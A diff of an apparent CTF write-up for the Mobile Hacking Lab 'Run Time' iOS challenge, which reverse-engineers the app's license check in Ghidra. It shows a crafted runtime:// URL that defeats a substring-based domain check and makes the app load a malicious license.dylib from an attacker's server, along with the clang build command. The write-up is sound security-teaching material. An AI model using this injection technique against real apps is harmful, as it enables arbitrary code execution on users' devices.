@@ -1,20 +1,51 @@
+---
+title: Mobile Hacking Lab - Run Time
+description: "Welcome to the iOS Application Security Lab: Dynamic Library Injection Challenge. This challenge focuses on a fictitious app called Run Time , which tracks the steps while running. Your objective is to bypass the app's protections, deliver the exploit and gain code execution utilizing the dynamic library injection."
+tags:
+  - code-execution
+  - bypass
+  - dylib
+  - bypass
+  - strings
+  - rev-binaries
+  - python
+  - MobileHackingLab
+  - ios
+keywords:
+  - ios hacking
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - ios reversing
+  - ios exploitation
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20Run%20Time/
+---
+
 **Description**: Welcome to the **iOS Application Security Lab: Dynamic Library Injection Challenge**. This challenge focuses on a fictitious app called Run Time , which tracks the steps while running. Your objective is to bypass the app's protections, deliver the exploit and gain code execution utilizing the dynamic library injection.
 
 **Download**: https://lautarovculic.com/my_files/runtime.ipa
+
 **Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-runtime
 
 ![[runtime1.png]]
 
 Install an **IPA** file can be difficult.
+
 So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
+
 **LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE
 
 **NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.
 
 First let's understand the app behavior.
+
 I recommend make this flow intercepting **all request** in **burpsuite** for a better understanding.
 
 Well, we don't have many functionalities.
+
 I just can intercept *two request*:
 ```HTTP
 GET /runtime/health HTTP/2
@@ -40,8 +71,11 @@ Sec-Fetch-Dest: document
 ```
 
 With nothing useful information.
+
 We just have functions like *Sync Data*, *See history*, *Start free trial* and *Suscribe now*.
+
 Let's move to **Static analysis** *unzipping* the **`.ipa`** file.
+
 Looking for **`Info.plist`** file, we can se some interesting data
 
 The **URL scheme**
@@ -63,6 +97,7 @@ The **URL scheme**
 Wich is **`runtime://`**
 
 The **Bundle ID**: `com.mobilehackinglab.runtime` (may be for work with frida).
+
 And the **SceneDelegate** (for *custom URL handling*).
 ```XML
 <key>UIApplicationSceneManifest</key>
@@ -84,6 +119,7 @@ This can be a little helpful for understanding some behavior of the app
 strings "Runtime" | grep "openURLContexts"
 ```
 And we can see `scene:openURLContexts:`
+
 Now it's time for look some what see in ghidra with strings analysis.
 ```bash
 strings "Runtime" | grep -iE "openURLContexts|suscribe|token|license|checkout|request|runtime://|key"
@@ -117,14 +153,21 @@ NUIApplicationOpenExternalURLOptionsKey
 LaunchOptionsKey
 NUIApplicationLaunchOptionsKey
 ```
+
 Useful information:
+
 - **Library**: `license.dylib`
+
 - Some **Keys** references like `stringForKey` and `trialKey`
+
 - **URL**:
+
 	- `runtime://buypro?server=mhl.pages.dev/runtime`
+
 	- `runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`
 
 Let's load the binary into **ghidra**.
+
 We can see the **`getLicenseFile`** function, which is
 ```CPP
 void __thiscall
@@ -283,8 +326,11 @@ Runtime::SubscribeController::getLicenseFile
 }
 ```
 This code **build a request** where **param_1** is the server.
+
 The **X-API-Key** is **param_3**, expecting a **key**.
+
 This request is **`http://`**, we can found the line
+
 `Swift::String::init("http://",7,1);`. And also, we have the *endpoint* `/download` in `Swift::String::init("/download",9,(__int8)(local_c4 & 1));`
 
 The URL looks like: `http://<server_url>/download`
@@ -417,10 +463,13 @@ void __thiscall Runtime::SubscribeController::subscribeNow(SubscribeController *
 ```
 
 We can see that try open an URL
+
 `SVar4 = Swift::String::init("runtime://buypro?server=mhl.pages.dev/runtime",0x2d,1);`
+
 Also, check if there exist an app that can *handle the URL*.
 
 But I don't see nothing useful for us.
+
 There are also another function, **`trialSubscription`**
 ```CPP
 void __thiscall Runtime::SubscribeController::trialSubscription(SubscribeController *this)
@@ -549,9 +598,11 @@ void __thiscall Runtime::SubscribeController::trialSubscription(SubscribeControl
 }
 ```
 Which also is from **SubscribeController** class.
+
 Several local variables are defined, including pointers and structures that are likely to be used to handle URLs, strings and other data.
 
 A string representing a URL (“`runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`”) is created and a URL object  is initialized.
+
 Also, checks like the previous function with `canOpenURL:`.
 
 And the *'most important'* code that we need inspect is the **`verifyLicense`** function:
@@ -870,34 +921,49 @@ Runtime::SubscribeController::verifyLicense
 }
 ```
 Also, corresponds to **SubscribeController** class.
+
 Let me explain in deep what this function do.
 
 **Server verification**
+
 Checks if the server has the string “**`mhl.pages.dev`**”, which suggests that it is validating against a specific domain.
+
 If the URL *does not contain this string*, it displays an “**Invalid Server**” error message.
 
 **Buypro detection**
+
 If the **license key** (**`param_3`**) contains the string “**`buypro`**”, *redirect to a purchase URL* (`/payment?license_type=pro`) by *opening it in the browser*.
+
 *Before opening the URL*, check if the device (again) *can open the URL* (`UIApplication canOpenURL:`). If possible, open it with `openURL:`.
 
 **Key Validation**
+
 **Checks if the license key has the regex format** `^[0-9]{4}-[0-9]{4}-[A-Z]{4}$` (Example: “**`1234-5678-ABCD`**”).
+
 If it *does not match*, it displays an error message “**`Invalid license format`**”.
 
 **URL Build**
+
 If the **license key is valid**, it *constructs a verification URL* `http://<server>/health` and converts it to a `Foundation::URL` object.
 
 **HTTP Verification**
+
 A `dataTaskWithURL:completionHandler:` request is made to the **constructed URL**.
+
 The `completionHandler` handles the **HTTP response**, checking **if the key is valid**.
 
 So, in short
+
 - *If it passes all validations*, it makes an HTTP request to `http://<server>/health` to *verify the license*.
+
 - If the **server confirms the license**, the *app considers it valid*.
 
 But now, we need know how **`license.dylib`** is loaded in the app, right?
+
 Here's the code, in this function:
+
 `void $$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.`
+
 I'll use fragment to explain because is a huge function.
 
 If there is no connection to the server, it displays a “**Cannot connect to host**” error.
@@ -950,6 +1016,7 @@ _dlsym(local_638,local_200);
 ```
 
 - If **`register_device`** **fails**, it displays “*Device registration failed*”.
+
 - If **successful**, displays “**Upgraded to Pro**”.
 ```CPP
 if (((uint)pcVar7 & 1) == 0) {
@@ -962,15 +1029,21 @@ if (((uint)pcVar7 & 1) == 0) {
 ```
 
 Let's exploit that, please.
+
 First, we need **create a local server**, then, we send the request (via URL scheme `runtine://`).
+
 But we need *bypass* the `mhl.pages.dev` verification.
+
 We can just do this request:
+
 `runtime://starttrial?server=<our_server>/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`
+
 The verification checks if **contains** the string, not if the requested server is `mhl.pages.dev` ;)
 
 Now that we know how to cheat validation, let's go to:
 
 - Create a **fake server** that *responds like the original*.
+
 - Serve a malicious `license.dylib` to **execute arbitrary code**.
 
 ```python
@@ -1038,6 +1111,7 @@ clang -arch arm64 -dynamiclib -o license.dylib license.c
 ![[runtime2.png]]
 
 Now we just need open browser and then go to
+
 `runtime://starttrial?server=192.168.1.75:8080/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`
 
 (`192.168.1.75` is my local IP)
@@ -1058,7 +1132,9 @@ We got the responses!
 ![[runtime3.png]]
 
 So, where the **`.dylib`** file was uploaded and our **`.txt`** file?
+
 We can use objection for that:
+
 With the app running
 ```bash
 objection -g "Runtime" explore
@@ -1066,6 +1142,7 @@ objection -g "Runtime" explore
 ![[runtime4.png]]
 
 Then, via SSH we can see in **`Documents`** directory:
+
 ![[runtime5.png]]
 
 I hope you found it useful (:
